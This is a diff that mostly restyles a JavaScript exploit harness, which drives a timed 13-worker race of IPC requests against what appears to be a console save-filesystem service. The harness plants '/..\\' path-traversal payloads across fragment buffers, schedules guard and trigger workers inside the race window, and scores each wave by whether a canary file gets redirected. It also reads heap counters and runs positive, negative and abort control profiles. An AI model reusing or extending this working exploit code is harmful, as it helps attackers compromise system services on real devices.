@@ -1,53 +1,49 @@
 import coreRuntime from "../runtime.mjs";
 
 const {
-  FRAME_SENTINEL,
-  MCPY,
-  SEND,
-  SETB,
-  SIGNAL,
-  SLEEP,
-  TICK,
-  WAIT,
-  allocPage,
-  checkWindow,
-  closeHandle,
-  cmifReply,
-  collectSpans,
-  extractRoleTimings,
-  prepPacket,
-  qualifyOverlap,
-  read32,
-  read64,
-  read8,
-  readAllocationCounters,
-  readFrameResult,
-  roleSendCode,
-  sendIPC,
-  ticksToUs,
-  write32,
-  write8,
-  writeStr,
-  writeXDesc
+    FRAME_SENTINEL,
+    MCPY,
+    SEND,
+    SETB,
+    SIGNAL,
+    SLEEP,
+    TICK,
+    WAIT,
+    allocPage,
+    checkWindow,
+    closeHandle,
+    cmifReply,
+    collectSpans,
+    extractRoleTimings,
+    prepPacket,
+    qualifyOverlap,
+    read32,
+    read64,
+    read8,
+    readAllocationCounters,
+    readFrameResult,
+    roleSendCode,
+    sendIPC,
+    ticksToUs,
+    write32,
+    write8,
+    writeStr,
+    writeXDesc
 } = coreRuntime;
 
-// ── Wave planning and configuration ───────────────────────────────────────
+// ----- Wave planning and configuration -----
 
-// Workers are pinned to one core with decreasing priorities so
-// dispatch order is deterministic. roleDelays are kept so server-side
-// processing overlaps correctly: without them, all 10 initial requests
-// arrive as a burst and the server finishes the quick ones before
-// W9's sequential sends let the guards/trigger fire.
+/** Build one worker plan per role: the packet, the handle and the frame steps it sends. */
 export function buildPlans(input) {
     const config = input.config;
-    let REQ = input.REQ;
-    let clearPkt = input.clearPkt;
-    let gates = input.gates;
-    let pinPkt = input.pinPkt;
-    let prePkt = input.prePkt;
-    let roleHandles = input.roleHandles;
-    let rootSession = input.rootSession;
-    let triggerBuf = input.triggerBuf;
+    const REQ = input.REQ;
+    const clearPkt = input.clearPkt;
+    const gates = input.gates;
+    const pinPkt = input.pinPkt;
+    const prePkt = input.prePkt;
+    const roleHandles = input.roleHandles;
+    const rootSession = input.rootSession;
+    const triggerBuf = input.triggerBuf;
     var plans = [];
 
     for (var i = 0; i < 13; i++) {
@@ -58,36 +54,38 @@ export function buildPlans(input) {
 
         var steps = [WAIT(gates.masterGate)];
 
-        // W0-W9: stagger with roleDelays for server-side overlap.
-        // Priority ordering guarantees dispatch order within the
-        // same delay bucket; the delays give long operations (Commit,
-        // Read) a head start so they are still in-flight when the
-        // guards and trigger fire.
+        /*
+         * Active roles W0-W6 and W9 use roleDelays to create server-side overlap.
+         * When several workers are runnable on the shared core, priority determines
+         * which gets CPU time first. The delays give Commit and Read a head start so
+         * they can still be in flight when the guards and trigger run.
+         */
         if (i < 10) {
             steps.push(SLEEP(config.roleDelays[i]));
         }
 
-        // W10-W11 (guards): gate-based, same as timed.
+        // W10-W11 (guards): wait for release, then apply their configured delays.
         if (i >= 10 && i < 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(SLEEP(config.guardDelays[i - 10]));
         }
 
-        // W12 (trigger): gate-based with abort-guard sampling.
-        // No initial sleep: on a single core with the lowest priority,
-        // W12 cannot run until all others are blocked. The gate
-        // already synchronises with W9's release signal.
+        /*
+         * W12 has no configured start delay. It waits for W9's release and W11's
+         * guard signal before sampling the abort flags. Its lower priority lets any
+         * higher-priority runnable worker run first on the pinned core.
+         */
         if (i === 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(WAIT(gates.guardLaunchedGate));
             steps.push(SLEEP(400000));
             steps.push(MCPY(gates.spacingDecision,
-                gates.bottleneckFinished, 4));
+                            gates.bottleneckFinished, 4));
             steps.push(WAIT(gates.bottleneckDoneGate));
             steps.push(MCPY(gates.sampledCompleted,
-                gates.completedFlag, 4));
+                            gates.completedFlag, 4));
             steps.push(MCPY(gates.sampledEarlyHole,
-                gates.earlyHole, 4));
+                            gates.earlyHole, 4));
             steps.push(MCPY(0n, gates.sampledCompleted, 4));
             steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
             steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
@@ -106,7 +104,7 @@ export function buildPlans(input) {
         // W11: sample bottleneck state and signal the trigger.
         if (i === 11) {
             steps.push(MCPY(gates.earlyHole,
-                gates.bottleneckFinished, 4));
+                            gates.bottleneckFinished, 4));
             steps.push(SIGNAL(gates.guardLaunchedGate));
         }
 
@@ -125,8 +123,7 @@ export function buildPlans(input) {
             steps.push(SIGNAL(gates.groupReleasedGate));
         }
 
-        if (i === 0 || (i >= 2 && i <= 8) ||
-            i === 10 || i === 11) {
+        if (isScheduledWorker(i)) {
             steps.push(SETB(gates.completedFlag, 1));
             steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
         }
@@ -137,32 +134,40 @@ export function buildPlans(input) {
     return plans;
 }
 
+
+
+/** Wire the profile-specific packets and buffers for the next wave. No wave runs here. */
 export function configureProfile(profile, input) {
     const config = input.config;
-    let REQ = input.REQ;
-    let SCRATCH_DIR = input.SCRATCH_DIR;
-    let extentTotal = input.extentTotal;
-    let fragmentBufs = input.fragmentBufs;
-    let segments = input.segments;
-    let selectedDir = input.selectedDir;
-    let triggerBuf = input.triggerBuf;
+    const REQ = input.REQ;
+    const SCRATCH_DIR = input.SCRATCH_DIR;
+    const extentTotal = input.extentTotal;
+    const fragmentBufs = input.fragmentBufs;
+    const segments = input.segments;
+    const selectedDir = input.selectedDir;
+    const triggerBuf = input.triggerBuf;
     var payload = new Array(extentTotal);
     var positive = profile === "positive";
-    for (var i = 0; i < extentTotal; i++) payload[i] = positive ? 0x42 : 0x2F;
+    for (var i = 0; i < extentTotal; i++) {
+        payload[i] = positive ? 0x42 : 0x2F;
+    }
     payload[extentTotal - 1] = 0;
 
     if (positive) {
-        for (var fs = config.POSITIVE_FILL_SEGMENT; fs < 0x2340; fs += config.POSITIVE_FILL_SEGMENT + 1)
+        for (var fs = config.POSITIVE_FILL_SEGMENT; fs < 0x2340; fs += config.POSITIVE_FILL_SEGMENT + 1) {
             payload[fs] = 0x2F;
+        }
         writeIntoPayload(payload, selectedDir, 0x2340);
-        for (var i = 0x2340 + selectedDir.length; i < config.EXTENT_SIZE; i++)
+        for (var i = 0x2340 + selectedDir.length; i < config.EXTENT_SIZE; i++) {
             payload[i] = 0x2F;
+        }
         writeIntoPayload(payload, "/..\\", 0);
     } else if (profile === "extent-absent" || profile === "extent-present") {
         writeIntoPayload(payload, SCRATCH_DIR + "/", 0);
-        for (var i = 0; i < segments.length; i++)
+        for (var i = 0; i < segments.length; i++) {
             writeIntoPayload(payload, "/" + segments[i] + "/",
-                (i + 1) * config.SLOT_SIZE);
+                             (i + 1) * config.SLOT_SIZE);
+        }
         var basename = profile === "extent-absent" ? "SPAN_ABSENT" : "SPAN_MARKER";
         writeIntoPayload(payload, basename, config.EXTENT_SIZE - basename.length);
     } else {
@@ -170,86 +175,110 @@ export function configureProfile(profile, input) {
     }
 
     var pieces = [];
-    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
+    for (var at = 0; at < payload.length; at += config.SLOT_SIZE) {
         pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));
-    for (var i = 0; i < pieces[0].length; i++)
+    }
+    for (var i = 0; i < pieces[0].length; i++) {
         write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
+    }
     for (var piece = 1; piece < pieces.length; piece++) {
-        for (var k = 0; k < pieces[piece].length; k++)
+        for (var k = 0; k < pieces[piece].length; k++) {
             write8(fragmentBufs[piece - 1] + BigInt(k),
-                BigInt(pieces[piece][k]));
+                   BigInt(pieces[piece][k]));
+        }
         writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
-            pieces[piece].length);
+                   pieces[piece].length);
     }
     return {configured: true};
 }
 
+/** Lay one copy step's bytes into the trigger and fragment buffers. */
 export function configurePayload(tailBytes, input) {
     const config = input.config;
-    let REQ = input.REQ;
-    let fragmentBufs = input.fragmentBufs;
-    let triggerBuf = input.triggerBuf;
+    const REQ = input.REQ;
+    const fragmentBufs = input.fragmentBufs;
+    const triggerBuf = input.triggerBuf;
     var payloadLen = config.MARKER_OFFSET + tailBytes.length + 1;
     var payload = new Array(payloadLen);
-    for (var i = 0; i < payloadLen; i++) payload[i] = 0x42;
+    for (var i = 0; i < payloadLen; i++) {
+        payload[i] = 0x42;
+    }
     payload[0] = 0x2F; payload[1] = 0x2E; payload[2] = 0x2E; payload[3] = 0x5C;
-    for (var i = 0; i < tailBytes.length; i++)
+    for (var i = 0; i < tailBytes.length; i++) {
         payload[config.MARKER_OFFSET + i] = tailBytes[i];
+    }
     payload[payloadLen - 1] = 0;
 
     var pieces = [];
-    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
+    for (var at = 0; at < payload.length; at += config.SLOT_SIZE) {
         pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));
+    }
 
-    for (var i = 0; i < pieces[0].length; i++)
+    for (var i = 0; i < pieces[0].length; i++) {
         write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
+    }
     for (var piece = 1; piece < pieces.length; piece++) {
-        for (var k = 0; k < pieces[piece].length; k++)
+        for (var k = 0; k < pieces[piece].length; k++) {
             write8(fragmentBufs[piece - 1] + BigInt(k),
-                BigInt(pieces[piece][k]));
+                   BigInt(pieces[piece][k]));
+        }
         writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
-            pieces[piece].length);
+                   pieces[piece].length);
     }
     return {configured: true};
 }
 
+/** Write a string into a buffer and return the offset just past its terminator. */
 export function writeIntoPayload(payload, text, offset) {
-    for (var i = 0; i < text.length; i++)
+    for (var i = 0; i < text.length; i++) {
         payload[offset + i] = text.charCodeAt(i);
+    }
 }
 
+/**
+ * Check that both paths of a pair resolve as absent, so neither rename can land on
+ * an existing entry. The diagnostics stay in the result and never reach the log.
+ */
 export function checkPathPairQuiet(path0, size0, path1, size1, input) {
-    let savedHandle = input.savedHandle;
+    const savedHandle = input.savedHandle;
     var controlPkt = allocPage(0x2000);
     var p0 = allocPage(0x1000);
     var p1 = allocPage(0x1000);
     writeStr(p0, path0);
     writeStr(p1, path1);
     prepPacket(controlPkt, (4 | (2 << 16)) >>> 0, 8,
-        [[32, 0x49434653], [40, 5]]);
+               [[32, 0x49434653], [40, 5]]);
     writeXDesc(controlPkt, 8, p0, size0, 0);
     writeXDesc(controlPkt, 16, p1, size1, 1);
     var transport = Number(sendIPC(savedHandle, controlPkt)) >>> 0;
     var result = transport === 0
         ? Number(cmifReply(controlPkt).result) >>> 0 : 0xFFFFFFFF;
     var ok = transport === 0 && result === 0x202;
-    if (input.returnDiagnostics === true)
+
+    if (input.returnDiagnostics === true) {
         return {ok: ok, transport: transport, result: result};
+    }
+
     return ok;
 }
 
 function snapshotRenamePathBuffers(pathBuffers) {
-    if (!pathBuffers) return null;
+    if (!pathBuffers) {
+        return null;
+    }
+
     var names = ["fillerSource", "fillerDestination",
         "guardSource", "guardDestination"];
     var snapshots = Object.create(null);
     for (var ni = 0; ni < names.length; ni++) {
         var name = names[ni];
         var spec = pathBuffers[name];
+
         if (!spec || spec.address == null || !Number.isFinite(spec.size)) {
             snapshots[name] = {available: false};
             continue;
         }
+
         var hash = 0x811C9DC5;
         var firstNul = -1;
         var firstDiff = null;
@@ -260,15 +289,22 @@ function snapshotRenamePathBuffers(pathBuffers) {
                 var byte = (word >>> (byteIndex * 8)) & 0xFF;
                 var absoluteIndex = offset + byteIndex;
                 hash = Math.imul(hash ^ byte, 0x01000193) >>> 0;
-                if (byte === 0 && firstNul < 0) firstNul = absoluteIndex;
-                var expectedByte = null;
-                if (typeof spec.expected === "string") {
-                    if (absoluteIndex < spec.expected.length)
-                        expectedByte = spec.expected.charCodeAt(absoluteIndex);
-                    else if (absoluteIndex === spec.expected.length &&
-                        spec.expected.length < spec.size)
-                        expectedByte = 0;
+
+                if (byte === 0 && firstNul < 0) {
+                    firstNul = absoluteIndex;
                 }
+
+                var expectedByte = null;
+
+                if (typeof spec.expected === "string") {
+                    if (absoluteIndex < spec.expected.length) {
+                        expectedByte = spec.expected.charCodeAt(absoluteIndex);
+                    } else if (absoluteIndex === spec.expected.length &&
+                        spec.expected.length < spec.size) {
+                        expectedByte = 0;
+                    }
+                }
+
                 if (expectedByte !== null && byte !== expectedByte &&
                     firstDiff === null) {
                     firstDiff = {offset: absoluteIndex,
@@ -289,7 +325,10 @@ function snapshotRenamePathBuffers(pathBuffers) {
 }
 
 function snapshotRenameDescriptors(REQ, pathBuffers, workerRoles) {
-    if (!REQ || !pathBuffers) return null;
+    if (!REQ || !pathBuffers) {
+        return null;
+    }
+
     var allRoles = [
         {role: 7, first: "fillerSource", second: "fillerDestination"},
         {role: 8, first: "fillerSource", second: "fillerDestination"},
@@ -338,7 +377,11 @@ function snapshotRenameDescriptors(REQ, pathBuffers, workerRoles) {
             };
             descriptor.matchesExpected = Boolean(spec &&
                 word0 === expectedWord0 && word1 === expectedWord1);
-            if (!descriptor.matchesExpected) allMatch = false;
+
+            if (!descriptor.matchesExpected) {
+                allMatch = false;
+            }
+
             record.descriptors.push(descriptor);
         }
         output.push(record);
@@ -346,6 +389,10 @@ function snapshotRenameDescriptors(REQ, pathBuffers, workerRoles) {
     return {allMatch: allMatch, roles: output};
 }
 
+/**
+ * Snapshot the rename buffers and descriptors before a wave sends. A later
+ * comparison can then tell a write that landed from a packet that got trampled.
+ */
 export function captureRenameInputState(REQ, pathBuffers, workerRoles) {
     return {
         buffers: snapshotRenamePathBuffers(pathBuffers),
@@ -353,68 +400,98 @@ export function captureRenameInputState(REQ, pathBuffers, workerRoles) {
     };
 }
 
+/** Ask the save filesystem for the canary entry, which must still be a file. */
 export function queryCanaryHealth(input) {
-    let canaryPath = input.canaryPath;
-    let savedHandle = input.savedHandle;
-    let setupPath = input.setupPath;
-    let setupPkt = input.setupPkt;
+    const canaryPath = input.canaryPath;
+    const savedHandle = input.savedHandle;
+    const setupPath = input.setupPath;
+    const setupPkt = input.setupPkt;
     writeStr(setupPath, canaryPath);
     prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
     writeXDesc(setupPkt, 8, setupPath, canaryPath.length + 1);
     write32(setupPkt + 0x10n, 0x49434653n);
     write32(setupPkt + 0x18n, 7n);
     var transport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
-    if (transport !== 0)
+
+    if (transport !== 0) {
         return { transport: transport, result: 0xFFFFFFFF, type: -1 };
+    }
+
     var reply = cmifReply(setupPkt);
     var type = reply.result === 0
         ? (Number(read32(setupPkt + BigInt(reply.data))) >>> 0) : -1;
     return { transport: transport, result: reply.result, type: type };
 }
 
+/**
+ * Split a byte sequence into its nul-write steps, the unit the copy waves use to
+ * grow the path one field at a time.
+ */
 export function nulWrites(desired) {
     var last = -1;
     for (var i = desired.length - 1; i >= 0; i--) {
-        if (desired[i] !== 0) { last = i; break; }
+        if (desired[i] !== 0) {
+            last = i;
+            break;
+        }
     }
-    if (last + 1 >= desired.length) throw new Error("nulWrites: needs trailing zero");
+
+    if (last + 1 >= desired.length) {
+        throw new Error("nulWrites: needs trailing zero");
+    }
+
     var ends = [last + 1];
     for (var end = last; end >= 0; end--) {
-        if (desired[end] === 0) ends.push(end);
+        if (desired[end] === 0) {
+            ends.push(end);
+        }
     }
     return ends.map(function(end) {
         var bytes = [];
-        for (var i = 0; i < end; i++) bytes.push(desired[i] || 0x42);
+        for (var i = 0; i < end; i++) {
+            bytes.push(desired[i] || 0x42);
+        }
         return { end: end, bytes: bytes };
     });
 }
 
-// ── Wave result analysis ──────────────────────────────────────────────────
+// ----- Wave result analysis -----
 
+/**
+ * Read a joined wave back and decide every gate in one place.
+ *
+ * The order below follows the evidence: overlap spans first, then the W9 support
+ * replies, then the heap counters, then each role's result. The `checkWindow` call
+ * at the end turns that evidence into named gates, so a rejection names the check
+ * that failed instead of returning a bare false.
+ *
+ * Returns the gate verdict, the pin handle the next wave has to reuse, and the
+ * counter vectors the timing fit reads.
+ */
 export function analyzeWave(profile, wave, waveData, group, createPinThisWave, input) {
     const config = input.config;
-    let REQ = input.REQ;
-    let clearPkt = input.clearPkt;
-    let clearSendIndex = input.clearSendIndex;
-    let gates = input.gates;
+    const REQ = input.REQ;
+    const clearPkt = input.clearPkt;
+    const clearSendIndex = input.clearSendIndex;
+    const gates = input.gates;
     let pinFirstWaveQualified = input.pinFirstWaveQualified;
     let pinHandle = input.pinHandle;
-    let pinPkt = input.pinPkt;
-    let pinSendIndex = input.pinSendIndex;
-    let pktBuf = input.pktBuf;
-    let prePkt = input.prePkt;
-    let preSendIndex = input.preSendIndex;
-    let rootSession = input.rootSession;
-    let sendIndices = input.sendIndices;
-    let abortControlCanonical = input.abortControlCanonical;
-    let canaryPath = input.canaryPath;
-    let savedHandle = input.savedHandle;
-    let setupPath = input.setupPath;
-    let setupPkt = input.setupPkt;
+    const pinPkt = input.pinPkt;
+    const pinSendIndex = input.pinSendIndex;
+    const pktBuf = input.pktBuf;
+    const prePkt = input.prePkt;
+    const preSendIndex = input.preSendIndex;
+    const rootSession = input.rootSession;
+    const sendIndices = input.sendIndices;
+    const abortControlCanonical = input.abortControlCanonical;
+    const canaryPath = input.canaryPath;
+    const savedHandle = input.savedHandle;
+    const setupPath = input.setupPath;
+    const setupPkt = input.setupPkt;
     var renameInputDiagnostics = null;
+
     if (input.renamePathBuffers && input.renameInputBefore) {
-        var renameBufferAfter = snapshotRenamePathBuffers(
-            input.renamePathBuffers);
+        var renameBufferAfter = snapshotRenamePathBuffers(input.renamePathBuffers);
         var renameBufferNames = ["fillerSource", "fillerDestination",
             "guardSource", "guardDestination"];
         var changedRenameBuffers = [];
@@ -423,12 +500,16 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             var bufferName = renameBufferNames[rbi];
             var beforeBuffer = input.renameInputBefore.buffers?.[bufferName];
             var afterBuffer = renameBufferAfter?.[bufferName];
+
             if (!beforeBuffer?.available || !afterBuffer?.available) {
                 unexpectedRenameBuffers.push(bufferName + ":unavailable");
                 continue;
             }
-            if (beforeBuffer.hash !== afterBuffer.hash)
+
+            if (beforeBuffer.hash !== afterBuffer.hash) {
                 changedRenameBuffers.push(bufferName);
+            }
+
             if (!beforeBuffer.matchesExpected || !afterBuffer.matchesExpected) {
                 var mismatch = !afterBuffer.matchesExpected
                     ? afterBuffer.firstDiff : beforeBuffer.firstDiff;
@@ -448,16 +529,20 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             buffersMatchExpected: unexpectedRenameBuffers.length === 0
         };
     }
+
     var canonicalResultCode = function(result) {
         var raw = Number(result) >>> 0;
         return raw === 0xFFFFFFFF ? raw : raw & 0x3FFFFF;
     };
     var spans = collectSpans(waveData.frames, sendIndices, config.roleLabels);
     var trigSpan = null;
-    for (var si = 0; si < spans.length; si++)
-        if (spans[si].name === "trigger") trigSpan = spans[si];
+    for (var si = 0; si < spans.length; si++) {
+        if (spans[si].name === "trigger") {
+            trigSpan = spans[si];
+        }
+    }
     var overlap = qualifyOverlap(spans, trigSpan, config.overlapRoles,
-        config.throughRoles, config.heldRoles);
+                                 config.throughRoles, config.heldRoles);
 
     var scv = Number(read32(gates.sampledCompleted)) >>> 0;
     var sev = Number(read32(gates.sampledEarlyHole)) >>> 0;
@@ -470,6 +555,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
 
     var pinSent = roleSendCode(waveData.frames, 9, pinSendIndex) === 0;
     var pinReply;
+
     if (pinSent) {
         pinReply = cmifReply(pinPkt);
     } else {
@@ -478,16 +564,22 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
 
     var pinShapeOk = pinReply.result === 0 && (!createPinThisWave ||
         (pinReply.copies.length === 0 && pinReply.moves.length === 1));
+
     if (createPinThisWave && pinShapeOk) {
         pinHandle = pinReply.moves[0];
     }
 
     if (createPinThisWave && !pinShapeOk) {
-        for (var ph = 0; ph < pinReply.moves.length; ph++) closeHandle(pinReply.moves[ph]);
-        for (var ph = 0; ph < pinReply.copies.length; ph++) closeHandle(pinReply.copies[ph]);
+        for (var ph = 0; ph < pinReply.moves.length; ph++) {
+            closeHandle(pinReply.moves[ph]);
+        }
+        for (var ph = 0; ph < pinReply.copies.length; ph++) {
+            closeHandle(pinReply.copies[ph]);
+        }
     }
 
     var clearReply;
+
     if (roleSendCode(waveData.frames, 9, clearSendIndex) === 0) {
         clearReply = cmifReply(clearPkt);
     } else {
@@ -495,6 +587,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     }
 
     var preReply;
+
     if (roleSendCode(waveData.frames, 9, preSendIndex) === 0) {
         preReply = cmifReply(prePkt);
     } else {
@@ -502,10 +595,12 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     }
 
     var preStats = null;
+
     if (preReply.result === 0) {
         preStats = [];
-        for (var pi = 0; pi < 16; pi++)
+        for (var pi = 0; pi < 16; pi++) {
             preStats.push(Number(read64(prePkt + BigInt(preReply.data + pi * 8))));
+        }
     }
 
     var afterStats = readAllocationCounters(rootSession, pktBuf);
@@ -525,14 +620,24 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         durationUs: preProbeTimingMeasured
             ? ticksToUs(preProbeEnd - preProbeStart) : null
     };
-    // W9 sends pin/clear/pre inside the race window; their round trips are
-    // server-load samples at the critical moment. The TICK steps around each
-    // SEND already store the timestamps, so this only reads them back.
+
+    /*
+     * W9 sends pin/clear/pre inside the race window, so their round trips sample the
+     * server load at the critical moment. The TICK steps around each SEND already store
+     * the timestamps, and this only reads them back.
+     */
     var probeDurationUs = function(sendIndex) {
-        if (sendIndex < 0) return null;
+        if (sendIndex < 0) {
+            return null;
+        }
+
         var start = readFrameResult(waveData.frames[9].frame, sendIndex - 1);
         var end = readFrameResult(waveData.frames[9].frame, sendIndex + 1);
-        if (start === FRAME_SENTINEL || end === FRAME_SENTINEL) return null;
+
+        if (start === FRAME_SENTINEL || end === FRAME_SENTINEL) {
+            return null;
+        }
+
         return ticksToUs(end - start);
     };
     var pinPersistentBytes = createPinThisWave && afterStats && group.before
@@ -545,9 +650,12 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             group.before[5]) <= config.HEAP_JITTER_BYTES);
 
     var sendCodes = [];
-    for (var ci = 0; ci < sendIndices.length; ci++)
+    for (var ci = 0; ci < sendIndices.length; ci++) {
         sendCodes.push(roleSendCode(waveData.frames, ci, sendIndices[ci]));
-    var transportOk = sendCodes.filter(function(c) { return c === 0; }).length;
+    }
+    var transportOk = sendCodes.filter(function(c) {
+        return c === 0;
+    }).length;
     var resultAt = function(index) {
         if (sendCodes[index] !== 0) {
             return 0xFFFFFFFF;
@@ -556,7 +664,10 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         return Number(cmifReply(REQ[index]).result) >>> 0;
     };
     var typeAt = function(index, result) {
-        if (result !== 0 || sendCodes[index] !== 0) return -1;
+        if (result !== 0 || sendCodes[index] !== 0) {
+            return -1;
+        }
+
         var reply = cmifReply(REQ[index]);
         return Number(read32(REQ[index] + BigInt(reply.data))) >>> 0;
     };
@@ -589,17 +700,26 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     var pinEndMarginUs = pinWindowMeasured
         ? ticksToUs(canaryEnd - pinEnd) : null;
 
-    if (createPinThisWave)
+    if (createPinThisWave) {
         pinFirstWaveQualified = pinShapeOk && pinWindowOk && pinCostOk && restored;
+    }
 
     var changedPaths = [];
-    if (canaryResult !== 0 || canaryType !== 1) changedPaths.push("canary");
-    for (var fi = 0; fi < fillerResults.length; fi++)
-        if (canonicalResultCode(fillerResults[fi]) !== 0x202)
+
+    if (canaryResult !== 0 || canaryType !== 1) {
+        changedPaths.push("canary");
+    }
+
+    for (var fi = 0; fi < fillerResults.length; fi++) {
+        if (canonicalResultCode(fillerResults[fi]) !== 0x202) {
             changedPaths.push(config.roleLabels[fillerRoles[fi]]);
-    for (var gi = 0; gi < guardResults.length; gi++)
-        if (canonicalResultCode(guardResults[gi]) !== 0x202)
+        }
+    }
+    for (var gi = 0; gi < guardResults.length; gi++) {
+        if (canonicalResultCode(guardResults[gi]) !== 0x202) {
             changedPaths.push("guard" + gi);
+        }
+    }
 
     var selectedMarker = triggerResult === 0 && triggerType === 1;
     var observedCanaryRedirect = canaryResult === 0 && canaryType === 0 &&
@@ -619,23 +739,6 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
     }) && guardResults.every(function(r) {
         return canonicalResultCode(r) === 0x202;
     });
-
-    var window = Boolean(reservationExpected &&
-        wave.done === config.WORKER_COUNT &&
-        transportOk === config.WORKER_COUNT &&
-        wave.joined === config.WORKER_COUNT &&
-        protectedDone === config.protectedRoles.length &&
-        releaseWasSent &&
-        Number(wave.signalResult) === 0 && trigSpan &&
-        overlap.shapeCount === config.OVERLAP_COUNT &&
-        overlap.receiveMarginUs !== null && overlap.receiveMarginUs >= 300 &&
-        !triggerAborted && tailsExpected && commitResult === 0 &&
-        readResult === 0 && pathsExpected &&
-        pinShapeOk && clearReply.result === 0 &&
-        preReply.result === 0 && restored && pinCostOk &&
-        (!createPinThisWave || pinWindowOk) && pinFirstWaveQualified &&
-        preReleaseUsed !== null &&
-        preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);
 
     var postCanaryHealthy = health.transport === 0 &&
         health.result === 0 && health.type === 1;
@@ -688,11 +791,15 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
             pre: preStats ? preStats[5] : null,
             after: afterStats ? afterStats[5] : null
         },
-        // Full 16-field MemoryReportInfo vectors (peaks cleared on read, so
-        // each window summarizes retroactively what happened inside it).
-        // Field map: 0-2 pooled buffer (Commit pressure), 3-4+9 buffer
-        // manager (content cache), 5 exp heap, 6+10 buffer pool, 7-8 patrol
-        // read (background activity), 11 async pooled failures.
+
+        /*
+         * The full 16-field MemoryReportInfo vectors. Peaks clear on read, so each
+         * window describes after the fact what happened inside it.
+         *
+         * Field map: 0-2 pooled buffer (Commit pressure), 3-4 and 9 buffer manager
+         * (content cache), 5 exp heap, 6 and 10 buffer pool, 7-8 patrol read
+         * (background activity), 11 async pooled failures.
+         */
         counterVector: {
             before: group.before || null,
             held: group.held || null,
@@ -750,7 +857,7 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         canaryRedirect: profile === "positive" && wc.ok && canaryRedirect && postCanaryHealthy,
         extentQualified: profile === "extent-present" && wc.ok && selectedMarker &&
             canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
-        negativeControl: profile === "negative" && window && !triggerAborted &&
+        negativeControl: profile === "negative" && wc.ok && !triggerAborted &&
             triggerCanonical === 0x2EEC02 && canaryResult === 0 &&
             canaryType === 1 && postCanaryHealthy,
         abortControl: triggerAborted && scv === 1 &&
@@ -767,4 +874,9 @@ export function analyzeWave(profile, wave, waveData, group, createPinThisWave, i
         pinHandle: pinHandle,
         pinFirstWaveQualified: pinFirstWaveQualified
     };
+}
+
+function isScheduledWorker(roleIndex) {
+    return roleIndex === 0 || (roleIndex >= 2 && roleIndex <= 8) ||
+        roleIndex === 10 || roleIndex === 11;
 }
